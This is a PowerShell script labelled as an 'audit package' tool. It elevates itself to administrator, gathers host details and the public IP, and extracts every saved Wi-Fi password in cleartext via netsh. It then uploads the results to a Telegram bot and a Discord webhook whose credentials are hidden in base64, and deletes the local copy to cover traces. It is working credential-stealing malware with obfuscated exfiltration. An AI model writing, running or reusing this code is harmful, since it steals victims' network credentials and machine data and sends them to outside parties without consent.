# ========== CONFIG ==========
$VerboseMode = $true
$Version = "2.1.0"

# ========== ENCODED ENDPOINTS ==========
$T_Token_B64 = "ODAzMTQzNTU3NjpBQUV4SnkwQ1JkdHlFR3lpbl9iNjRUMDlPZmpIai1HOFUycw=="
$T_Chat_B64 = "MTg0OTI2OTcwOA=="
$D_Hook_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=="

# Runtime Decoding
$T_Token = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($T_Token_B64))
$T_Chat  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($T_Chat_B64))
$D_Hook  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($D_Hook_B64))

# ========== CORE UTILITIES ==========
function Write-InternalLog { param([string]$Msg, [string]$Col = "Cyan"); if ($VerboseMode) { Write-Host "[*] $Msg" -ForegroundColor $Col } }

function Assert-Privileges {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Write-InternalLog "Escalating context..."
        Start-Process -FilePath powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
        exit 1
    }
}

# ========== DATA COLLECTION ==========
function Gather-EnvironmentMetrics {
    Write-InternalLog "Collecting environment metrics..."
    $cs = Get-CimInstance Win32_ComputerSystem
    $os = Get-CimInstance Win32_OperatingSystem
    $cpu = Get-CimInstance Win32_Processor
    $gpu = Get-CimInstance Win32_VideoController
    $mem = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
    $publicIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { "Unknown" }
    
    return [PSCustomObject]@{
        HostName     = $env:COMPUTERNAME
        Model        = $cs.Model
        Manufacturer = $cs.Manufacturer
        Platform     = $os.Caption
        Build        = $os.Version
        Processor    = $cpu.Name
        LogicCores   = $cpu.NumberOfCores
        MemoryGB     = [Math]::Round($mem.Sum / 1GB, 2)
        Graphics     = $gpu.Name
        ExternalIP   = $publicIp
        Timestamp    = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        Revision     = $Version
    }
}

function Extract-NetworkCredentials {
    Write-InternalLog "Extracting network credentials..."
    $profiles = netsh wlan show profiles 2>$null |
        Select-String "All User Profile" |
        ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | Sort-Object -Unique

    $data = @()
    foreach ($p in $profiles) {
        $info = netsh wlan show profile name="$p" key=clear 2>$null
        $key = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
        if (-not $key) { $key = "<Unsecured or No Local Cache>" }
        $data += [PSCustomObject]@{ SSID = $p; Key = $key }
    }
    return $data
}

# ========== PACKAGE GENERATION ==========
function Compile-AuditPackage {
    param($Metrics, $Creds)
    $report = @"
=========================================
      AUDIT PACKAGE - $Version
=========================================
METRICS:
-----------------------------------------
Host          : $($Metrics.HostName)
Model         : $($Metrics.Model)
Vendor        : $($Metrics.Manufacturer)
Platform      : $($Metrics.Platform) ($($Metrics.Build))
CPU           : $($Metrics.Processor) ($($Metrics.LogicCores) Cores)
RAM           : $($Metrics.MemoryGB) GB
GPU           : $($Metrics.Graphics)
External IP   : $($Metrics.ExternalIP)
Time          : $($Metrics.Timestamp)

CREDENTIALS:
-----------------------------------------
"@
    foreach ($c in $Creds) {
        $report += "`nSSID: $($c.SSID)`nKEY:  $($c.Key)`n-----------------------------------------"
    }
    $report += "`n`n[PACKAGE COMPLETE]"
    return $report
}

# ========== DATA DISPATCH ==========
function Transmit-Package {
    param($PayloadPath, $PayloadName, $RawContent)
    
    # --- Telegram Dispatch ---
    Write-InternalLog "Dispatching via Channel T..."
    try {
        $boundary = [guid]::NewGuid().ToString()
        $LF = "`r`n"
        $fileBytes = [System.IO.File]::ReadAllBytes($PayloadPath)
        $url = "https://api.telegram.org/bot$T_Token/sendDocument"

        $body = "--$boundary$LF"
        $body += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$T_Chat$LF"
        $body += "--$boundary$LF"
        $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$PayloadName`"$LF"
        $body += "Content-Type: text/plain$LF$LF"

        $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)
        $endBytes = [Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
        $payload = $bodyBytes + $fileBytes + $endBytes

        $wc = New-Object Net.WebClient
        $wc.Headers["Content-Type"] = "multipart/form-data; boundary=$boundary"
        $wc.UploadData($url, "POST", $payload) | Out-Null
        Write-InternalLog "Channel T success." "Green"
    } catch { Write-InternalLog "Channel T fail: $($_.Exception.Message)" "Red" }

    # --- Discord Dispatch ---
    Write-InternalLog "Dispatching via Channel D..."
    try {
        # Discord limit is 2000 chars per message, but we send it as a file snippet or chunked
        # For simplicity and to match the file exfil, we send it as a webhook post
        $discordBody = @{
            content = "New Audit Package from $($env:COMPUTERNAME)"
            embeds = @(@{
                title = "Audit Results"
                description = "```$($RawContent.Substring(0, [Math]::Min(1900, $RawContent.Length)))```"
                color = 3447003
            })
        }
        Invoke-RestMethod -Uri $D_Hook -Method Post -Body ($discordBody | ConvertTo-Json) -ContentType "application/json"
        Write-InternalLog "Channel D success." "Green"
    } catch { Write-InternalLog "Channel D fail: $($_.Exception.Message)" "Red" }
}

# ========== EXECUTION FLOW ==========
Assert-Privileges

$Metrics = Gather-EnvironmentMetrics
$Creds = Extract-NetworkCredentials
$Package = Compile-AuditPackage -Metrics $Metrics -Creds $Creds

# Stage Payload
$pName = "$($Metrics.HostName)_Report_$(Get-Date -Format 'HHmm').txt"
$pPath = Join-Path $env:TEMP $pName
$Package | Out-File -FilePath $pPath -Encoding UTF8

# Dispatch
Transmit-Package -PayloadPath $pPath -PayloadName $pName -RawContent $Package

# Clean
if (Test-Path $pPath) { Remove-Item $pPath -Force -ErrorAction SilentlyContinue }
Write-InternalLog "Audit flow complete." "Green"
